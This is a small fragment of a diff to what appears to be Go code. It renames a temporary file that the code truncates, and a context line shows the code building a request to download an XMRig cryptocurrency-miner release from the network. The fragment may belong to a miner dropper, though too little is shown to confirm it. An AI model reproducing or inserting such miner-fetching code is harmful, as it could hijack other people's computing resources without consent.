@@ -83,7 +83,7 @@ r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/07
 
 //clear  file  created by check  try 
 
-os.Truncate("/tmp/teste" , 0)
+os.Truncate("/tmp/try_vkzmn" , 0)
 
 
  
